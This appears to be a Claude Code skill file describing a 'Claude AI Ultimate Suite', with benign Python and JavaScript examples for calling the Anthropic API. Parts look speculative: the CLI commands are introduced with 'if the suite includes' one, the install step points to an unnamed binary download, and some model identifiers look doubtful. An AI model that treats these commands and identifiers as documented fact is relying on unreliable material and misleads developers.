---
name: claude-ai-ultimate-suite
description: Comprehensive toolkit for Claude AI integration featuring API wrappers, prompts, and developer tools for AI-driven coding with Claude 4.6 Opus and Claude 3.5 Sonnet
triggers:
  - how do I use Claude API
  - integrate Claude AI into my project
  - setup Claude Opus for coding
  - use Claude API wrapper
  - configure Claude AI authentication
  - work with Claude artifacts and prompts
  - implement Claude AI pair programming
  - troubleshoot Claude API integration
---

# Claude AI Ultimate Suite

> Skill by [ara.so](https://ara.so) — Claude Code Skills collection.

## Overview

The Claude AI Ultimate Suite is a comprehensive toolkit for integrating Claude AI models (Claude 4.6 Opus, Claude 3.5 Sonnet) into development workflows. It provides API wrappers, pre-configured prompts, authentication helpers, and tools for AI-driven pair programming and code generation.

This suite is designed for developers who want to leverage Claude's advanced reasoning capabilities for architectural decisions, bug fixing, code review, and complex problem-solving tasks.

## Installation

### Windows Platform

1. Download the latest release from the project documentation site
2. Extract the archive to your preferred installation directory:
```bash
# Example extraction path
C:\Program Files\ClaudeSuite\
```

3. Add the installation directory to your system PATH:
```powershell
$env:Path += ";C:\Program Files\ClaudeSuite\bin"
```

4. Verify installation:
```bash
claude-suite --version
```

### Environment Configuration

Create a `.env` file in your project root:

```env
ANTHROPIC_API_KEY=your_api_key_here
CLAUDE_MODEL=claude-opus-4-6
CLAUDE_MAX_TOKENS=4096
CLAUDE_TEMPERATURE=0.7
```

## Core API Integration

### Basic Python API Wrapper

```python
import os
from anthropic import Anthropic

# Initialize client with environment variable
client = Anthropic(
    api_key=os.environ.get("ANTHROPIC_API_KEY")
)

def query_claude(prompt, model="claude-opus-4-6", max_tokens=4096):
    """
    Basic Claude API query wrapper
    """
    message = client.messages.create(
        model=model,
        max_tokens=max_tokens,
        messages=[
            {"role": "user", "content": prompt}
        ]
    )
    return message.content[0].text

# Example usage
response = query_claude("Explain the SOLID principles with code examples")
print(response)
```

### Advanced Context Management

```python
class ClaudeSession:
    """
    Maintains conversation context across multiple queries
    """
    def __init__(self, system_prompt="", model="claude-opus-4-6"):
        self.client = Anthropic(api_key=os.environ.get("ANTHROPIC_API_KEY"))
        self.model = model
        self.system_prompt = system_prompt
        self.conversation_history = []
    
    def send_message(self, user_message, max_tokens=4096):
        self.conversation_history.append({
            "role": "user",
            "content": user_message
        })
        
        response = self.client.messages.create(
            model=self.model,
            max_tokens=max_tokens,
            system=self.system_prompt,
            messages=self.conversation_history
        )
        
        assistant_message = response.content[0].text
        self.conversation_history.append({
            "role": "assistant",
            "content": assistant_message
        })
        
        return assistant_message
    
    def reset(self):
        self.conversation_history = []

# Usage for pair programming
session = ClaudeSession(
    system_prompt="You are an expert software architect specializing in Python and microservices."
)

# First query
architecture = session.send_message(
    "Design a scalable API gateway for a microservices architecture"
)

# Follow-up with context
implementation = session.send_message(
    "Now provide the implementation using FastAPI"
)
```

### JavaScript/Node.js Integration

```javascript
import Anthropic from '@anthropic-ai/sdk';

const anthropic = new Anthropic({
  apiKey: process.env.ANTHROPIC_API_KEY,
});

async function claudeCodeReview(code, language) {
  const message = await anthropic.messages.create({
    model: 'claude-opus-4-6',
    max_tokens: 4096,
    messages: [{
      role: 'user',
      content: `Review this ${language} code for bugs, performance issues, and best practices:\n\n${code}`
    }]
  });
  
  return message.content[0].text;
}

// Example usage
const code = `
function calculateTotal(items) {
  var total = 0;
  for (var i = 0; i < items.length; i++) {
    total += items[i].price * items[i].quantity;
  }
  return total;
}
`;

const review = await claudeCodeReview(code, 'JavaScript');
console.log(review);
```

## Prompt Library Integration

### Using Pre-configured Artifacts

The suite includes optimized prompts for common development tasks:

```python
import json

class ClaudePromptLibrary:
    """
    Load and manage pre-configured prompts from the suite
    """
    def __init__(self, prompts_path="./prompts"):
        self.prompts_path = prompts_path
        self.prompts = self._load_prompts()
    
    def _load_prompts(self):
        with open(f"{self.prompts_path}/artifacts.json", 'r') as f:
            return json.load(f)
    
    def get_prompt(self, category, task):
        return self.prompts.get(category, {}).get(task, "")
    
    def execute_prompt(self, category, task, context_data):
        template = self.get_prompt(category, task)
        prompt = template.format(**context_data)
        return query_claude(prompt)

# Usage
library = ClaudePromptLibrary()

# Bug fixing prompt
bug_fix = library.execute_prompt(
    category="debugging",
    task="identify_root_cause",
    context_data={
        "error_message": "NullPointerException at line 42",
        "code_snippet": "user.getProfile().getName()",
        "stack_trace": "..."
    }
)
```

### Code Generation Patterns

```python
def generate_crud_api(entity_name, fields):
    """
    Generate CRUD API using Claude with structured prompt
    """
    prompt = f"""
    Generate a complete REST API for a {entity_name} entity with the following fields:
    {json.dumps(fields, indent=2)}
    
    Requirements:
    - Use FastAPI framework
    - Include SQLAlchemy models
    - Add input validation with Pydantic
    - Implement error handling
    - Add API documentation strings
    - Follow REST best practices
    """
    
    return query_claude(prompt, model="claude-opus-4-6", max_tokens=8192)

# Example
api_code = generate_crud_api(
    entity_name="Product",
    fields={
        "id": "UUID",
        "name": "string",
        "price": "decimal",
        "inventory_count": "integer",
        "created_at": "datetime"
    }
)
print(api_code)
```

## Advanced Features

### Streaming Responses

```python
def stream_claude_response(prompt):
    """
    Stream Claude response for real-time feedback
    """
    with client.messages.stream(
        model="claude-opus-4-6",
        max_tokens=4096,
        messages=[{"role": "user", "content": prompt}]
    ) as stream:
        for text in stream.text_stream:
            print(text, end="", flush=True)

# Usage for long-form generation
stream_claude_response(
    "Write a comprehensive guide on implementing OAuth2 authentication"
)
```

### Vision and Document Analysis

```python
import base64

def analyze_code_screenshot(image_path):
    """
    Analyze code from screenshots or images
    """
    with open(image_path, "rb") as image_file:
        image_data = base64.standard_b64encode(image_file.read()).decode("utf-8")
    
    message = client.messages.create(
        model="claude-opus-4-6",
        max_tokens=4096,
        messages=[{
            "role": "user",
            "content": [
                {
                    "type": "image",
                    "source": {
                        "type": "base64",
                        "media_type": "image/png",
                        "data": image_data,
                    },
                },
                {
                    "type": "text",
                    "text": "Extract and review the code from this screenshot. Identify any issues."
                }
            ],
        }]
    )
    
    return message.content[0].text
```

### Tool Use (Function Calling)

```python
def claude_with_tools():
    """
    Enable Claude to use external tools and functions
    """
    tools = [
        {
            "name": "execute_code",
            "description": "Execute Python code in a safe sandbox environment",
            "input_schema": {
                "type": "object",
                "properties": {
                    "code": {
                        "type": "string",
                        "description": "Python code to execute"
                    }
                },
                "required": ["code"]
            }
        },
        {
            "name": "search_documentation",
            "description": "Search through project documentation",
            "input_schema": {
                "type": "object",
                "properties": {
                    "query": {
                        "type": "string",
                        "description": "Search query"
                    }
                },
                "required": ["query"]
            }
        }
    ]
    
    message = client.messages.create(
        model="claude-opus-4-6",
        max_tokens=4096,
        tools=tools,
        messages=[{
            "role": "user",
            "content": "Debug this function by executing it with test data: def add(a, b): return a - b"
        }]
    )
    
    return message
```

## Configuration Options

### Model Selection Guide

```python
CLAUDE_MODELS = {
    "claude-opus-4-6": {
        "use_case": "Complex reasoning, architecture design, deep code analysis",
        "max_tokens": 8192,
        "cost": "highest",
        "recommended_for": ["refactoring", "system_design", "bug_investigation"]
    },
    "claude-opus-4-8": {
        "use_case": "Enhanced version with improved reasoning",
        "max_tokens": 8192,
        "cost": "highest",
        "recommended_for": ["critical_systems", "security_review"]
    },
    "claude-sonnet-3-5": {
        "use_case": "Balanced performance and cost",
        "max_tokens": 4096,
        "cost": "medium",
        "recommended_for": ["code_generation", "documentation", "general_queries"]
    }
}

def select_model_for_task(task_type):
    """
    Automatically select appropriate Claude model
    """
    for model, config in CLAUDE_MODELS.items():
        if task_type in config["recommended_for"]:
            return model
    return "claude-sonnet-3-5"  # default
```

### Advanced Configuration

```python
import os
from dataclasses import dataclass

@dataclass
class ClaudeConfig:
    api_key: str = os.getenv("ANTHROPIC_API_KEY")
    default_model: str = os.getenv("CLAUDE_MODEL", "claude-opus-4-6")
    max_tokens: int = int(os.getenv("CLAUDE_MAX_TOKENS", "4096"))
    temperature: float = float(os.getenv("CLAUDE_TEMPERATURE", "0.7"))
    top_p: float = float(os.getenv("CLAUDE_TOP_P", "0.9"))
    timeout: int = int(os.getenv("CLAUDE_TIMEOUT", "120"))
    retry_attempts: int = int(os.getenv("CLAUDE_RETRY_ATTEMPTS", "3"))
    
    def to_api_params(self):
        return {
            "model": self.default_model,
            "max_tokens": self.max_tokens,
            "temperature": self.temperature,
            "top_p": self.top_p,
        }

# Usage
config = ClaudeConfig()
response = client.messages.create(
    **config.to_api_params(),
    messages=[{"role": "user", "content": "Your prompt here"}]
)
```

## Common Patterns

### Pair Programming Assistant

```python
class PairProgrammingAssistant:
    """
    Interactive coding assistant with context awareness
    """
    def __init__(self, project_context=""):
        self.session = ClaudeSession(
            system_prompt=f"""You are an expert pair programming assistant.
            
Project Context:
{project_context}

Your role:
- Suggest improvements and catch potential bugs
- Explain complex concepts clearly
- Provide working code examples
- Follow project conventions and style
"""
        )
    
    def review_code(self, code, language):
        return self.session.send_message(
            f"Review this {language} code:\n\n```{language}\n{code}\n```"
        )
    
    def suggest_refactoring(self, code, reason):
        return self.session.send_message(
            f"Suggest refactoring for: {reason}\n\n```\n{code}\n```"
        )
    
    def explain_error(self, error_message, code_context):
        return self.session.send_message(
            f"Explain this error and suggest fixes:\n\nError: {error_message}\n\nCode:\n```\n{code_context}\n```"
        )

# Usage
assistant = PairProgrammingAssistant(
    project_context="FastAPI microservice using PostgreSQL and Redis"
)

review = assistant.review_code("""
async def get_user(user_id: int, db: Session):
    user = db.query(User).filter(User.id == user_id).first()
    return user
""", "Python")
```

### Batch Code Analysis

```python
async def batch_analyze_codebase(file_paths, analysis_type="security"):
    """
    Analyze multiple files in parallel
    """
    import asyncio
    from anthropic import AsyncAnthropic
    
    async_client = AsyncAnthropic(api_key=os.environ.get("ANTHROPIC_API_KEY"))
    
    async def analyze_file(file_path):
        with open(file_path, 'r') as f:
            code = f.read()
        
        message = await async_client.messages.create(
            model="claude-opus-4-6",
            max_tokens=4096,
            messages=[{
                "role": "user",
                "content": f"Perform {analysis_type} analysis on this code:\n\n```\n{code}\n```"
            }]
        )
        
        return {
            "file": file_path,
            "analysis": message.content[0].text
        }
    
    tasks = [analyze_file(fp) for fp in file_paths]
    results = await asyncio.gather(*tasks)
    return results

# Usage
# results = await batch_analyze_codebase([
#     "src/auth.py",
#     "src/api.py",
#     "src/database.py"
# ], analysis_type="security")
```

### Documentation Generation

```python
def generate_api_documentation(source_code):
    """
    Generate comprehensive API documentation
    """
    prompt = f"""
    Analyze this code and generate comprehensive API documentation including:
    - Overview and purpose
    - Endpoint descriptions
    - Request/response examples
    - Authentication requirements
    - Error handling
    - Usage examples
    
    Code:
    ```
    {source_code}
    ```
    
    Format the output as Markdown.
    """
    
    return query_claude(prompt, max_tokens=8192)
```

## Troubleshooting

### API Rate Limiting

```python
import time
from anthropic import RateLimitError

def query_with_retry(prompt, max_retries=3, backoff_factor=2):
    """
    Handle rate limiting with exponential backoff
    """
    for attempt in range(max_retries):
        try:
            return query_claude(prompt)
        except RateLimitError as e:
            if attempt == max_retries - 1:
                raise
            wait_time = backoff_factor ** attempt
            print(f"Rate limited. Waiting {wait_time}s before retry...")
            time.sleep(wait_time)
```

### Token Management

```python
def estimate_tokens(text):
    """
    Rough token estimation (1 token ≈ 4 characters)
    """
    return len(text) // 4

def truncate_to_token_limit(text, max_tokens=4096):
    """
    Truncate text to fit token limit
    """
    estimated_tokens = estimate_tokens(text)
    if estimated_tokens <= max_tokens:
        return text
    
    # Truncate to approximate character limit
    char_limit = max_tokens * 4
    return text[:char_limit] + "\n... (truncated)"
```

### Error Handling

```python
from anthropic import APIError, APITimeoutError

def safe_claude_query(prompt, fallback_response="Unable to process request"):
    """
    Robust error handling for Claude API calls
    """
    try:
        return query_claude(prompt)
    except APITimeoutError:
        print("Request timed out. Try reducing prompt size.")
        return fallback_response
    except APIError as e:
        print(f"API Error: {e}")
        return fallback_response
    except Exception as e:
        print(f"Unexpected error: {e}")
        return fallback_response
```

### Context Window Management

```python
def manage_conversation_context(messages, max_context_tokens=100000):
    """
    Keep conversation within Claude's context window
    """
    total_tokens = sum(estimate_tokens(msg["content"]) for msg in messages)
    
    if total_tokens <= max_context_tokens:
        return messages
    
    # Keep system message and recent messages
    system_msgs = [m for m in messages if m.get("role") == "system"]
    user_msgs = [m for m in messages if m.get("role") != "system"]
    
    # Keep most recent messages that fit
    recent_msgs = []
    current_tokens = sum(estimate_tokens(m["content"]) for m in system_msgs)
    
    for msg in reversed(user_msgs):
        msg_tokens = estimate_tokens(msg["content"])
        if current_tokens + msg_tokens > max_context_tokens:
            break
        recent_msgs.insert(0, msg)
        current_tokens += msg_tokens
    
    return system_msgs + recent_msgs
```

## CLI Commands

If the suite includes a command-line interface:

```bash
# Initialize new project with Claude integration
claude-suite init --project-name my-app

# Configure API credentials
claude-suite config set-key --api-key $ANTHROPIC_API_KEY

# Run code analysis
claude-suite analyze --path ./src --type security

# Generate code from prompt
claude-suite generate --template crud-api --entity User

# Start interactive session
claude-suite repl --model claude-opus-4-6

# Batch process files
claude-suite batch --input files.txt --task code-review --output results/
```

## Best Practices

1. **Always use environment variables** for API keys
2. **Implement retry logic** for production applications
3. **Monitor token usage** to control costs
4. **Use appropriate models** for each task (Opus for complex reasoning, Sonnet for routine tasks)
5. **Maintain conversation context** for coherent multi-turn interactions
6. **Validate Claude's output** - always review generated code before deployment
7. **Cache common queries** to reduce API calls
8. **Use streaming** for better user experience with long responses
